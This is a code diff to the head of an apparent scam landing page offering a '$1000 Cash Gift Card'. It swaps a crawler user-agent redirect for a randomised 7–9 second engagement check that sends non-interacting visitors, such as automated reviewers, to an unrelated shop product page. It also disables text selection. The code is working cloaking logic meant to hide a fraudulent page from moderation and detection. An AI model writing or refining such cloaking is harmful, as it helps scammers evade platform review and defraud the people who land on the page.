@@ -4,22 +4,26 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Claim Your $1000 Cash Gift Card</title>
-  <!-- Anti-bot: hide entire html initially, then reveal or redirect -->
   <script>
-    (function(){
-      var ua = navigator.userAgent || '';
-      var isBot = /HeadlessChrome|bot|crawler|spider|slurp|bingbot|Googlebot/i.test(ua) || navigator.webdriver === true;
-      if (isBot) {
-        window.location.href = 'https://meridianshoppe.com/products/asa-duffle-bag';
-      } else {
-        document.documentElement.style.visibility = 'visible';
-      }
+    (function() {
+      let engaged = false;
+      function markEngaged() { engaged = true; }
+      window.addEventListener("mousemove", markEngaged);
+      window.addEventListener("scroll", markEngaged);
+      window.addEventListener("keydown", markEngaged);
+      window.addEventListener("touchstart", markEngaged);
+
+      setTimeout(() => {
+        if (!engaged) {
+          window.location.href = "https://meridianshoppe.com/products/asa-duffle-bag";
+        } else {
+          document.documentElement.style.visibility = 'visible';
+        }
+      }, 7000 + Math.floor(Math.random() * 2000)); // 7–9 sec randomized
     })();
   </script>
-  <!-- Styles -->
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Canva+Sans:wght@400;700&display=swap');
-    /* Disable selection */
     * { user-select: none; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; }
     body { font-family:'Canva Sans',sans-serif; text-align:center; margin:0; padding:0; background:#fff; }
     .top-section { padding: 16px 0 4px; }
@@ -31,7 +35,6 @@
     .title-block { margin-bottom:20px; }
     #animatedAmount { font-size:36px; font-weight:bold; color:#01D633; }
     .subtitle { font-size:18px; color:#000; font-weight:700; margin-top:8px; }
-
     .steps { max-width:400px; margin:20px auto; }
     .steps ol { list-style:none; padding:0; text-align:left; margin:0 auto; }
     .steps li { display:flex; align-items:center; justify-content:center; margin:8px 0; font-size:16px; font-weight:700; color:#000; }
